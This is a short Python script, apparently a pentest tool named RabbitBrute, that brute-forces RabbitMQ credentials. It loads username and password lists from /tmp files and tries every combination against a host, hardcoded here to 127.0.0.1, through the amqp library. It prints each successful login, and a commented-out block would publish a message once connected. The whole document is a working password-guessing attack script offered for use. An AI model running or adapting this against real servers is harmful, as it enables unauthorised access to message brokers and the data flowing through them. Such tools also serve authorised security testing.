#!/usr/bin/python

#
# RabbitBrute v0.1
# Description: Brute force the queue, user, password for RabbitMQ servers
#

import amqp

__author__ = 'Myles Hosford'
__date__ = '18/06/2014'


# Global variables
#
users = []
passwords = []
queues = []


def main():
    load_lists()
    rabbit_brute("127.0.0.1",users,passwords)
    print("[+] Brute force finished")


def rabbit_brute(host, users, passwords):
    for user in users:
        for password in passwords:
            #print("Attempting to brute: " + user + " : " + password)
            rabbit_connect(host,user,password)


def rabbit_connect(host, user, password):
    try:
        connection = amqp.Connection(host=host, userid=user, password=password)
        print("[+] Success. User: " + user + " --- Password: " + password)
    except OSError as e:
        print("[-] Connection refused: " + user + " : " + password)


#        channel = connection.channel()
#
#        message = amqp.Message("Test message!")
#        message.properties["delivery_mode"] = 2
#        channel.basic_publish(message, exchange="test", routing_key="test")
#


def load_lists():
    global users, passwords, queues
    try:
        users = readfile("/tmp/users.txt")
    except FileNotFoundError:
        print("Could not find users file")
    try:
        passwords = readfile("/tmp/passwords.txt")
    except FileNotFoundError:
        print("Could not find password file")


def usage():
    print("Running application..")

#
# Read filename and return as a list
#


def readfile(filename):
    f = open(filename)
    lines = [x.strip() for x in f.readlines()]
    return lines


main()
